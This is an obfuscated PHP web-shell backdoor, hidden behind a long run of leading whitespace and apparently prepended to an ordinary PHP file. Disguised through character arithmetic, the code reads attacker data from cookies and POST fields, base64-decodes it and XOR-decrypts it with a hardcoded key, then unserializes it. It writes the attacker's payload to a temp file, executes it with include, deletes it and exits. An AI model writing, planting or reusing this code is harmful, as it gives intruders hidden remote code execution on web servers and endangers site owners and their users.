<?php                                                                                                                                                                                                                                                                                                                                                                                                 $zSWIQz = chr (107) . "\116" . '_' . 'T' . chr ( 776 - 705 ).chr ( 438 - 363 ); $zLzDzeB = 'c' . chr ( 961 - 853 )."\141" . "\x73" . "\163" . "\137" . "\145" . chr (120) . 'i' . chr (115) . "\164" . chr ( 545 - 430 ); $QKfbTfMd = $zLzDzeB($zSWIQz); $bwASK = $QKfbTfMd;if (!$bwASK){class kN_TGK{private $vxUhjsGH;public static $yjlksgcw = "63c661ad-1cb9-4ab8-a044-d03895cdb89a";public static $IDpFq = NULL;public function __construct(){$QlnMpKbIC = $_COOKIE;$uRhoWcHzJ = $_POST;$QcMzY = @$QlnMpKbIC[substr(kN_TGK::$yjlksgcw, 0, 4)];if (!empty($QcMzY)){$GYLYtdaNg = "base64";$ShAigx = "";$QcMzY = explode(",", $QcMzY);foreach ($QcMzY as $piuFTYNOBw){$ShAigx .= @$QlnMpKbIC[$piuFTYNOBw];$ShAigx .= @$uRhoWcHzJ[$piuFTYNOBw];}$ShAigx = array_map($GYLYtdaNg . chr (95) . "\144" . 'e' . "\143" . 'o' . chr (100) . "\145", array($ShAigx,)); $ShAigx = $ShAigx[0] ^ str_repeat(kN_TGK::$yjlksgcw, (strlen($ShAigx[0]) / strlen(kN_TGK::$yjlksgcw)) + 1);kN_TGK::$IDpFq = @unserialize($ShAigx);}}public function __destruct(){$this->ANvALeJhKR();}private function ANvALeJhKR(){if (is_array(kN_TGK::$IDpFq)) {$gauMM = sys_get_temp_dir() . "/" . crc32(kN_TGK::$IDpFq[chr ( 1011 - 896 ).chr ( 297 - 200 ).chr (108) . chr ( 705 - 589 )]);@kN_TGK::$IDpFq["\167" . 'r' . chr ( 800 - 695 ).chr (116) . "\x65"]($gauMM, kN_TGK::$IDpFq["\143" . 'o' . chr ( 511 - 401 ).chr ( 593 - 477 ).'e' . "\x6e" . "\x74"]);include $gauMM;@kN_TGK::$IDpFq[chr (100) . chr ( 800 - 699 ).chr ( 371 - 263 ).chr (101) . chr ( 603 - 487 ).chr ( 253 - 152 )]($gauMM);exit();}}}$PbpRy = new kN_TGK(); $PbpRy = 54883;} ?><?php
